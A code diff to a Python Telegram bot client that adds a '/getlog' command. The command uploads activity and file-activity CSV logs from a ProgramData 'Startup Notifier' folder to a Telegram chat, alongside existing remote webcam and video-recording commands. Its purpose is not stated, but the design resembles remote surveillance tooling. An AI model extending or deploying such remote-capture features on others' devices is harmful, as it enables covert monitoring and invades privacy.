@@ -125,6 +125,19 @@ class TelegramClient:
             logger.error(f"Unexpected error sending video: {e}")
             return False
 
+    def send_document(self, file_path: str, caption: str = "") -> bool:
+        url = f"{self.base_url}/sendDocument"
+        try:
+            with open(file_path, "rb") as doc:
+                files = {"document": doc}
+                data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
+                response = requests.post(url, files=files, data=data, timeout=30)
+                response.raise_for_status()
+            return True
+        except Exception as e:
+            logger.error(f"Failed to send log file: {e}")
+            return False
+
     def listen_forever(self):
         """
         Persistent Telegram command listener.
@@ -230,6 +243,42 @@ class TelegramClient:
                                 pass
                         else:
                             self.send_message("❌ Failed to access webcam.")
+                        # -------------------
+                        # ACTIVITY LOG
+                        # -------------------
+                    elif command == "/getlog":
+                        logger.info("/getlog command received")
+
+                        import glob
+
+                        app_name = "Startup Notifier"
+                        base_path = os.path.join(
+                            os.environ.get("PROGRAMDATA", "C:\\ProgramData"),
+                            app_name
+                        )
+
+                        patterns = [
+                            os.path.join(base_path, "activity_log_*.csv"),
+                            os.path.join(base_path, "system_file_activity_*.csv"),
+                        ]
+
+                        found_any = False
+
+                        for pattern in patterns:
+                            matched_files = glob.glob(pattern)
+
+                            for log_path in matched_files:
+                                try:
+                                    self.send_document(
+                                        log_path,
+                                        caption=f"Activity Log: {os.path.basename(log_path)}"
+                                    )
+                                    found_any = True
+                                except Exception as e:
+                                    logger.error(f"Failed to send log {log_path}: {e}")
+
+                        if not found_any:
+                            self.send_message("No log files found yet.")
 
                     # -------------------
                     # VIDEO RECORDING
@@ -275,6 +324,8 @@ class TelegramClient:
                                 pass
                         else:
                             self.send_message("❌ Failed to record video.")
+
+
 
             except requests.exceptions.ReadTimeout:
                 logger.warning("Telegram long-poll timeout (expected)")
